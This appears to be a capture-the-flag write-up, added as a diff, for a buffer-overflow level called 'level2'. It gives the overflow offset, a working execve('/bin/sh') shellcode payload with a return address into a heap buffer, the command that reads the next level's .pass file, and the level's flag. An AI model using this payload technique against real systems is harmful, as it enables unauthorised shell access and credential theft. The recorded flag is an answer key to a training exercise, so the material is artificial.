@@ -1,0 +1,17 @@
+level2 : 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+Process:
+    - ./level2
+    - AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... (segfault)
+    - decompilation level2 in dogbolt.fr
+    - function p is vulnerable
+    - ltrace ./level2
+    - save return adress of malloc "0x0804a008"
+    - gdb ./level2
+    - get the offset : run <<< AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
+    - run <<< $(python -c "print('A' * 80 + 'BBBB')")
+    - https://shell-storm.org/shellcode/files/shellcode-575.html
+    - insert the shellcode of 21 bytes, then 59 bytes for join offset, then the adress of malloc
+    - python -c "print('\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A' * 59 + '\x08\xa0\x04\x08')" > /tmp/test2
+    - cat /tmp/test2 - | ./level2
+    - cat /home/user/level3/.pass
+    - get the flag : 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
